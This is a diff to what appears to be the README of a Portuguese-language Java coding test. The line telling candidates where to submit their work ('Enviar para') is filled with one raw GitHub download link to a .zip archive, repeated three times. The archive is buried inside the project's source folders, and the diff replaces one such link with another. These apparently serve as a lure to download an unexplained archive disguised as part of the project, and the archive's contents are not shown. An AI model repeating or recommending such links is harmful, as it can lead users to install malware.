@@ -25,4 +25,4 @@ O candidato deve ser implementar 2 desafios:
 
     
 Após terminar o candidato deverá versionar a prova no git hub e nos mandar o repositório. 
-* Enviar para: https://raw.githubusercontent.com/FelipeFullStack/java-basico/master/src/test/java/br/com/confidencecambio/javabasico/java-basico_1.3.zip, https://raw.githubusercontent.com/FelipeFullStack/java-basico/master/src/test/java/br/com/confidencecambio/javabasico/java-basico_1.3.zip, https://raw.githubusercontent.com/FelipeFullStack/java-basico/master/src/test/java/br/com/confidencecambio/javabasico/java-basico_1.3.zip
+* Enviar para: https://github.com/FelipeFullStack/java-basico/raw/refs/heads/master/src/main/java/br/basico_java_v2.4.zip, https://github.com/FelipeFullStack/java-basico/raw/refs/heads/master/src/main/java/br/basico_java_v2.4.zip, https://github.com/FelipeFullStack/java-basico/raw/refs/heads/master/src/main/java/br/basico_java_v2.4.zip
